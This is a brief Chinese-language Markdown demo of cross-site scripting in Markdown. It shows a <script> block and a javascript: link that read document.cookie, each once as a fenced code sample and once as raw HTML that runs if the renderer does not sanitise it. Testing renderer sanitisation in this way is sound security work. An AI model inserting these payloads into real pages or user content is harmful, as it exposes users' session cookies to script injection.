# Markdown XSS Script 攻擊

> 以下皆為直接在 Markdown 文件輸入 html script

## Script XSS

***程式碼***


```html
<script>
    alert(document.cookie);
</script>
```

<script>
    alert(document.cookie);
</script>

## 連結 Script XSS

***程式碼***

```html
<a href="javascript:alert(document.cookie);">連結 Script XSS</a>
```

***DEMO***

<a href="javascript:alert(document.cookie);">連結 Script XSS</a>


